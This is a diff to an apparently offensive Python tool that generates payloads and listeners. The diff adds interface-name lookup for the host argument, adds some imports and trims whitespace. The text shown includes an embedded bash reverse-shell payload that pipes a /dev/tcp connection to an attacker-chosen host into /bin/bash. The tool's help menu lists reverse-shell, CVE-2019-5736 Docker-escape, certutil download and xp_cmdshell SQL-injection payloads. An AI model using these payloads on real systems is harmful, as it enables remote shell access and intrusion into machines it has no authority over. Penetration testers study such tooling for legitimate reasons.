@@ -12,23 +12,27 @@
 # 14/06/2018                                                                                                #
 #                                                                                                           #
 # DESCRIPTION                                                                                               #
-#  Tool for payload and listener management                                                                 #
+#  A quick way to genererate various payloads and listeners                                                 #
 #                                                                                                           #
 # mikael.kall@kindredgroup.com                                                                              #
 #                                                                                                           #
 #############################################################################################################
 
+import random
+import getpass
 import signal
+import time
 import sys
 import os
 import termios
 import select
 import socket
 import fcntl
+import argparse
 import base64
 import binascii
 import urllib as ul
-
+import netifaces as ni
 
 # Handler to exist cleanly on ctrl+C
 def signal_handler(signal, frame):
@@ -434,7 +438,7 @@ import (
     "strings"
 )
 
-var payload = "#!/bin/bash\\necho 'exec 5<>/dev/tcp/%s/%s && cat <&5|/bin/bash 2>&5 >&5'|/bin/bash\\n" 
+var payload = "#!/bin/bash\\necho 'exec 5<>/dev/tcp/%s/%s && cat <&5|/bin/bash 2>&5 >&5'|/bin/bash\\n"
 ''' % (lhost, lport)
 
     payload += '''
@@ -527,8 +531,8 @@ Simplifies payload creation and listener.
     lin32    <LHOST> <LPORT>  |   x32 Linux payload
     mysql64  <LHOST> <LPORT>  |   x64 Linux mysql payload
     mofnc    <LHOST> <LPORT>  |   netcat reverse_tcp mof payload
-    dockerpy <LHOST> <LPORT>  |   cve-2019-5736 docker payload 
-    dockerb  <LHOST> <LPORT>  |   cve-2019-5736 docker compiled payload 
+    dockerpy <LHOST> <LPORT>  |   cve-2019-5736 docker payload
+    dockerb  <LHOST> <LPORT>  |   cve-2019-5736 docker compiled payload
                               |
   <~~~~~~~~~~~~~~~~~~~~~~~[Payloads CLI]~~~~~~~~~~~~~~~~~~~~~~~~~~>
                               |
@@ -548,7 +552,7 @@ Simplifies payload creation and listener.
     wincert  <LHOST> <LPORT>  |    windows download file with certutil
     winup    <LHOST> <LPORT>  |    windows webdav file upload
                               |
-  <~~~~~~~~~~~~~~~~~~~~~[Payloads SQLI]~~~~~~~~~~~~~~~~~~~~~~~~~~~~>  
+  <~~~~~~~~~~~~~~~~~~~~~[Payloads SQLI]~~~~~~~~~~~~~~~~~~~~~~~~~~~~>
                               |
     xpcmdi   exec <COMMAND>   |    Output xp_cmdshell sqli payload
                               |
@@ -585,6 +589,16 @@ if __name__ == '__main__':
     type = sys.argv[1]
     lhost = sys.argv[2]
     lport = sys.argv[3]
+
+    try:
+        socket.inet_aton(lhost)
+    except socket.error:
+        try:
+            ni.ifaddresses(lhost)
+            lhost = ni.ifaddresses(lhost)[ni.AF_INET][0]['addr']
+        except:
+            print('[-] No such interface: %s' % lhost)
+            sys.exit(1)
 
     if type == 'xpcmdi':
         _command = "0x%s" % binascii.hexlify(lport)
